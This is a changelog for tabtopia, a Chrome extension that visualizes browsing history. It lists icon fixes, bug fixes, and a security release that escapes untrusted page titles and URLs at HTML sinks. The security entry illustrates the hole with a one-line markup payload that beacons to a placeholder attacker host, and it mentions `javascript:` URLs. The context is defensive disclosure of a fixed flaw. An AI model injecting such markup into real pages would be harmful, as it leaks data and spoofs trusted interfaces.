# Changelog

All notable changes to tabtopia are recorded here.

Tabtopia ships **unpacked** — it is not distributed through the Chrome Web Store.
To run a release, load the repo at that tag via `chrome://extensions` → *Load unpacked*.

## [1.1.1] — 2026-07-16

Icon and asset fixes. Shipped same-day as 1.1, which carried all three of these.

### Fixed

- **The 128px extension icon was actually a 16×16 image**, so Chrome upscaled it
  8× everywhere the large icon appears. Now a true 128×128 of the same
  node-graph design.
- **The fallback favicon was a 0-byte PNG.** `images/default-favicon.png` was
  empty, so the fallback returned from `createLetterFavicon`'s catch block
  rendered broken. It's now an inline `data:` URI, encoded with
  `encodeURIComponent` rather than `btoa` — `btoa` is the most likely thing to
  have thrown on the path that reaches this fallback, so the fallback must not
  depend on it. The empty file is gone.

### Changed

- Icons consolidated under `icons/`; the manifest now also declares the 32px
  size (`icon32.png` already existed but was never referenced).
- Removed `favicon.ico` — a 16×16 leftover nothing referenced. (The remaining
  `favicon.ico` strings in the source resolve *remote* origins, not this file.)

## [1.1] — 2026-07-16

A stability and hardening release. No new features; everything below is a fix to
behavior that was already meant to work.

### Security

- **Escape untrusted page data at HTML sinks.** Every site controls its own
  `document.title`, image `alt` text and URL, and those values flowed unescaped
  into `innerHTML` / d3 `.html()` sinks on the privileged newtab, graph and
  sessions pages. The extension-pages CSP (`script-src 'self'`) blocked injected
  *script*, but markup still rendered — enough to beacon out via
  `<img src=//attacker/?leak>` or spoof the trusted UI. Escaping now happens at
  the sink in `graph-renderer`, `hero_images_display`, `sessions`, `stars` and
  `readout`, via a shared `escapeHtml` in `utility.js` (plus `safeUrl` for `href`
  sinks, where escaping alone still permits `javascript:`).
- `sessions.js` `highlightText()` escapes before inserting highlight markup, and
  matches against an equally-escaped term so queries containing `&`, `<` or `"`
  still highlight.

### Fixed

- **Treemap rendered nothing on a restarted profile.** A single titleless
  restored-tab entry threw in `formatTitle` inside the d3 `.text()` callback and
  aborted the entire draw ("Error initializing page", zero cells).
- **Newtab could hang on load.** `fitTextToCell`'s grow-font loop never
  terminated on empty text — a zero-size bounding box never exceeds the cell.
  Now bounded by `MAX_FONT_SIZE` with an empty-text guard. The `formatTitle` fix
  above made this path *more* reachable, so the two shipped together.
- **Readout sidebar hung on large history databases.** `chrome.history.search`
  ran unbounded; it now looks back 90 days.
- **Readout showed the wrong page on rapid hover.** Async bookmark/history
  fetches raced; a stale response could overwrite a newer one. The render now
  aborts if the hovered cell changed while fetching.
- **Hover broke after the graph refactor** — D3 event listeners are namespaced.
- Duplicate `escapeHtml` in `debug.js`. Being a classic script it never threw,
  but the weaker second definition won (rendering the string `"null"` for null
  input), and it made the file unparseable to ESLint — silently disabling *all*
  linting of `debug.js`.

### Changed

- **Search no longer survives a browser restart.** The intended scope is
  retain-across-tabs, not across sessions; the carrier moved from `localStorage`
  to `chrome.storage.session`. The URL `?q=` parameter is unchanged, live sync
  across open newtabs still works, and the old `localStorage` key is purged on
  load.
- A stale `?q=` no longer resurrects a query that was cleared in another tab.

### Internal

- Playwright e2e suite: **16 tests**, including a boot-health canary asserting
  every view — newtab, graph, sessions, stars, popup, debug — boots with zero
  uncaught page errors, and an escaping spec that drives a hostile `<title>`
  through the tabs API and asserts it materializes no element.
- ESLint is a live gate: `src/` is at **0 errors**. `src/lib/**` is ignored, so
  `--fix` can no longer rewrite the vendored `d3.min.js` / `lunr.min.js`.
- Removed `readout.js.orig`, which sat inside the extension source directory and
  would have been included in a packed build. `*.orig` / `*.rej` / `*.patch` are
  now gitignored.

## [1.0] — 2026-06-17

Standalone browsing-history visualizer: capture, four D3 views (treemap, graph,
sessions, stars), on-device Gemini Nano summarization, Lunr lexical search, local
favicons. No bridge, no MCP, no localhost backend.
